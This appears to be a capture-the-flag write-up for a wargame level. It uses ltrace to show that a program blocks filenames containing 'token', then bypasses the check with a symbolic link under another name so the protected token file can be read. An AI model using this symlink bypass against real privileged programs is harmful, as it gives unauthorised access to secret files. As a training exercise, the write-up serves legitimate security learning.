# Level 08

## Initial State
Two files are present in the home directory:
- `level08` (executable program)
- `token` (file we need to read)

## Analysis

### First Try
```bash
$ ./level08 
./level08 [file to read]

$ ./level08 token
You may not access 'token'
```

### Program Behavior Analysis
When examining the program execution with ltrace:
```bash
$ ltrace ./level08 token
__libc_start_main(0x08048554, 2, 0xbffff844, 0x080486b0, 0x08048720)
strstr("token", "token")                              = "token"
printf("You may not access '%s'\n", "token")          = 27
exit(1)
```

### Key Findings
1. Program expects a file path parameter
2. Uses `strstr()` function to search for the word "token" in the filename
3. Access is denied if "token" is found in the filename

## Solution Strategy

### Security Vulnerability
The program only checks the file name but doesn't follow symbolic links.

### Exploit Steps
1. Create a symbolic link to the token file with a different name:
```bash
$ ln -s ~/token /tmp/different_name
```

2. Run the program with the symbolic link:
```bash
$ ./level08 /tmp/different_name
```